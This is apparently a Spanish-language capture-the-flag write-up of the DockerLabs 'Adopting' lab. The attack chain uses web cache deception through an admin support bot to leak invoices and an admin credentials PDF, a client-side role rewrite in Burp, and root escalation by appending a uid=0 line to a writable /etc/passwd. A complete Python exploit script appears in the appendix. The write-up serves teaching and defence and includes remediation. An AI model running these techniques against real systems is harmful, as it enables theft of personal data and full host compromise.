# Adopting-DockerLabsES

> **Autor:** `dani-kl` · **Plataforma:** DockerLabs (ES) · **Objetivo:** `http://172.17.0.2:2300`
> **Tipo:** laboratorio autorizado · **Fecha:** 14-11-2026 · **Resultado:** `root` 💀

## 1 Encender laboratorio.

### 1.0 Desempaquetar el archivo comprimido y lanzar el laboratorio.

```bash
unzip adopting.zip
sudo bash auto_deploy.sh adopting.tar
```

El script de despliegue construye el contenedor Docker y publica la aplicación vulnerable en el puerto `2300/tcp`.

## 2 Reconocimiento y enumeración.

### 2.1 Escaneo de puertos (nmap).

```bash
nmap -p- --open -sS -sV -n -Pn 172.17.0.2
```

```text
PORT     STATE SERVICE
2300/tcp open  http   → aplicación "Adopting" (panel de login/registro)
```

Única superficie de ataque: la capa HTTP. Todo el esfuerzo posterior se concentra en ella.

### 2.2 Descubrimiento de contenido (dirb / gobuster).

`dirb` contra la raíz devuelve 3 rutas no funcionales (callejón sin salida). Tras registrarse y mapear la aplicación con Burp Suite, se fuerza el namespace de la API:

```bash
gobuster dir -u http://172.17.0.2:2300/api \
  -w /usr/share/seclists/Discovery/Web-Content/api-wordlist.txt -t 50 -x json
```

### 2.3 Mapeo de endpoints con Burp Suite.

- `/api/auth/login` y `/api/auth/me` → autenticación y perfil.
- `/cart/` → carrito de adopción; al aceptar genera una **factura PDF**.
- `/account/invoices/<ID>.pdf` → visor de facturas con **ID visible en la URL** (candidato a BOLA/IDOR).
- `/api/support/tickets` y `/support` → help center; el campo `screenshot_url` es **visitado por un bot con sesión de administrador**.
- `/admin` y `/internal/credentials-report.pdf` → recursos internos (descubiertos más adelante).

**Fuga de información (VULN-01, Baja):** la respuesta de registro revela el `id` propio, el token `hb_token` y la existencia de 5 cuentas previas (IDs 1–5), base para la enumeración posterior.

## 3 Lógica de negocio.

Registro → token de sesión → carrito → adopción → factura PDF por operación → visor de facturas → help center con tickets revisados por un administrador. Este último flujo (bot privilegiado que visita URLs aportadas por el usuario) es el pivote de toda la cadena.

## 4 Explotación.

### 4.1 Prueba BOLA/IDOR en facturas — control correcto (resultado negativo).

- Sin autenticar: `{"error":"authentication required"}` (existe) vs `{"error":"invoice not found"}` (no existe).
- Autenticado como otro usuario: `{"error":"forbidden"}` vs `{"error":"bad invoice id"}`.

La propiedad se valida **en servidor**: control positivo. Sin embargo, el diferencial de errores actúa como **oráculo de existencia** y la capa de caché frontal puede socavar este control (4.2).

### 4.2 Web Cache Deception → exfiltración de facturas de terceros (VULN-02, Alta).

**Concepto.** La caché inversa trata como estático todo URI que *termina en extensión estática* (`.pdf`), mientras el router del backend normaliza la ruta (ignora el sufijo `;user.pdf`) y ejecuta el handler **dinámico y autenticado**. El cuerpo autenticado queda almacenado bajo una clave "estática" y se sirve después a peticiones **sin privilegios**.

**Disparo.** Se alimenta al bot admin mediante un ticket de soporte:

```text
GET /account/invoices/1019.pdf;user.pdf   ← visitado por el bot (sesión admin)
GET /account/invoices/1019.pdf;user.pdf   ← atacante, 2ª petición → 200 + PDF cacheado
```

Automatización (oráculo de IDs → login → ticket → calentamiento de caché → descarga → verificación con `file`):

```bash
python3 cache_deception_exploit.py
```

**Impacto:** confidencialidad de datos de facturación (PII) de múltiples clientes. Script completo en el Anexo A (autor original: **Pyth0nK1d**).

### 4.3 Autorización rota: rol modificable por el cliente (VULN-03, Alta).

La SPA decide qué UI administrativa mostrar a partir del campo `role` devuelto por `/api/auth/login` y `/api/auth/me`: **autorización delegada a datos visibles por el cliente**. Con Burp Suite:

1. Scope limitado al objetivo: `Settings › Project › Scope › Target Scope › Add › http://172.17.0.2:2300`
2. Regla de reescritura: `Settings › Tools › Proxy › HTTP match and replace rules › Add`

| Campo   | Valor             |
|---------|-------------------|
| Type    | Response body     |
| Match   | `"role":"user"`   |
| Replace | `"role":"admin"`  |

Tras login, el dashboard muestra el **Operations Panel** (`/admin`), antes oculto, que expone un recurso interno. Inconsistencia de defensa en profundidad: `/internal/credentials-report.pdf` **sí** valida en servidor (`{"error":"admin required"}`), luego el bypass es solo cliente… pero la caché vuelve a ser el eslabón débil (4.4).

### 4.4 WCD sobre recurso interno → credenciales de administración (VULN-04, Crítica).

Las cabeceras confirman que el documento protegido participa en la caché:

```text
GET /internal/credentials-report.pdf
X-Cache: MISS
X-Cache-Key: /internal/credentials-report.pdf
```

Nuevo ticket con `screenshot_url = http://localhost:2300/internal/credentials-report.pdf;user.pdf`. Tras la visita del bot, el PDF autenticado queda cacheado y se descarga sin privilegios:

```bash
curl -s 'http://172.17.0.2:2300/internal/credentials-report.pdf' -o credentials-report.pdf
file credentials-report.pdf
# credentials-report.pdf: PDF document, version 1.3, 2 page(s)
```

El documento contiene **credenciales reservadas de administración**.

## 5 Post-explotación y escalada de privilegios.

### 5.1 Acceso SSH con credencial filtrada.

```bash
ssh pingu@172.17.0.2
```

### 5.2 Enumeración local: `/etc/passwd` escribible (VULN-05, Crítica).

```bash
ls -la /etc/passwd
# -rw-rw-rw- 1 root pingu … /etc/passwd   ← escribible por nuestro usuario (debería ser 644 root:root)
```

Aunque los hashes viven en `/etc/shadow`, `/etc/passwd` **define las cuentas** (uid, gid, home, shell): poder escribirlo rompe por completo la frontera de privilegios.

### 5.3 Inyección de cuenta uid=0 → root.

```bash
openssl passwd -6 -salt 'dani' 'Sup3rSecret!'
echo 'dani:$6$dani$<HASH>:0:0::/root:/bin/bash' >> /etc/passwd
tail -n 1 /etc/passwd        # verificar que la reescritura persistió
su - dani
id                           # uid=0(root) gid=0(root) groups=0(root)
```

**Compromiso total del contenedor.** 👑

## 6 Resumen de hallazgos.

| ID      | Hallazgo                                   | CWE     | OWASP 2021 | Severidad |
|---------|--------------------------------------------|---------|------------|-----------|
| VULN-01 | Fuga de IDs/token en el registro           | CWE-200 | A01        | Baja      |
| —       | BOLA/IDOR en facturas                      | CWE-639 | A01        | *Controlado* |
| VULN-02 | WCD → exfiltración de facturas             | CWE-444 | A05        | Alta      |
| VULN-03 | Rol gestionado en cliente (bypass authz)   | CWE-862 | A01        | Alta      |
| VULN-04 | WCD sobre recurso interno → credenciales   | CWE-444 | A05        | Crítica   |
| VULN-05 | `/etc/passwd` escribible → root            | CWE-732 | A05        | Crítica   |

## 7 Remediación.

- **Caché:** no cachear respuestas de sesiones autenticadas; clavear por ruta *normalizada* (rechazar `;` y dobles extensiones); `Vary: Cookie, Authorization`; `Cache-Control: no-store` en endpoints dinámicos.
- **Autorización:** checks de rol/permiso **en servidor por petición**, desde estado de sesión server-side; nunca desde JSON entregado al cliente.
- **Bot de soporte:** sandbox de fetches, identidad de bajos privilegios, sin cookies de admin, allow-list de `screenshot_url`, sin caché compartida.
- **Sistema:** `/etc/passwd` a `root:root 644`; monitorización de integridad; mínimo privilegio en contenedores.
- **Credenciales:** rotar todas las presentes en el credentials-report.

## 8 Mapeo MITRE ATT&CK.

| Técnica | Nombre                              | Uso                          |
|---------|-------------------------------------|------------------------------|
| T1595   | Active Scanning                     | nmap / dirb / gobuster       |
| T1190   | Exploit Public-Facing Application   | Web Cache Deception          |
| T1552   | Unsecured Credentials               | credentials-report.pdf       |
| T1078   | Valid Accounts                      | SSH con credencial filtrada  |
| T1136.001 | Create Account: Local Account     | cuenta uid=0 en /etc/passwd  |
| T1548   | Abuse Elevation Control Mechanism   | escalada local a root        |

## 9 Anexo A — script de exfiltración (autor original: Pyth0nK1d).

```python
#!/usr/bin/env python3
# cache_deception_exploit.py — exfiltración de facturas vía Web Cache Deception
# Autor original: Pyth0nK1d · Documentado por: dani-kl
import requests, time, subprocess, sys
from pathlib import Path

BASE_URL = "http://172.17.0.2:2300"
START_ID, END_ID = 1000, 1019
EMAIL, PASSWORD = "<TU CORREO>", "<TU CONTRASEÑA>"

def existe_factura(s, i):
    r = s.get(f"{BASE_URL}/account/invoices/{i}.pdf", timeout=10)
    try:
        e = r.json().get("error")
    except ValueError:
        return r.status_code == 200
    return e == "authentication required"   # oráculo: existe vs "invoice not found"

def login(s):
    s.post(f"{BASE_URL}/api/auth/login",
           json={"email": EMAIL, "password": PASSWORD}, timeout=10)
    return s.cookies.get("hb_token")

def ticket(s, i):
    p = {"subject": "Precio incorrecto",
         "message": "He detectado un precio incorrecto en mi factura. Revisarlo, por favor.",
         "screenshot_url": f"http://localhost:2300/account/invoices/{i}.pdf;Pyth0nK1d.pdf"}
    return s.post(f"{BASE_URL}/api/support/tickets", json=p, timeout=10).status_code in (200, 201)

def descargar(s, i):
    r = s.get(f"{BASE_URL}/account/invoices/{i}.pdf;Pyth0nK1d.pdf", timeout=30, stream=True)
    if r.status_code != 200:
        return None
    f = f"{i}.pdf"
    with open(f, "wb") as fh:
        for c in r.iter_content(8192):
            if c: fh.write(c)
    subprocess.run(["file", f], check=False)
    return f

def main():
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0"
    ids = [i for i in range(START_ID, END_ID + 1) if existe_factura(s, i)]
    print(f"[+] Facturas existentes: {ids}")
    if not ids or not login(s):
        sys.exit("[!] Sin facturas o login fallido")
    for n, i in enumerate(ids, 1):
        print(f"[+] {n}/{len(ids)} · factura {i}")
        if ticket(s, i):
            time.sleep(10)   # el bot admin visita la URL y calienta la caché
            descargar(s, i)
        time.sleep(1)
    print("[+] PDFs:", sorted(p.name for p in Path(".").glob("*.pdf") if p.stem.isdigit()))

if __name__ == "__main__":
    main()
```

## 10 Aviso legal.

Evaluación realizada exclusivamente contra un laboratorio aislado e intencionadamente vulnerable (DockerLabs). Uso **educativo**; probar sistemas sin autorización es ilegal.

---

**dani-kl** · [github.com/dani-kl](https://github.com/dani-kl)
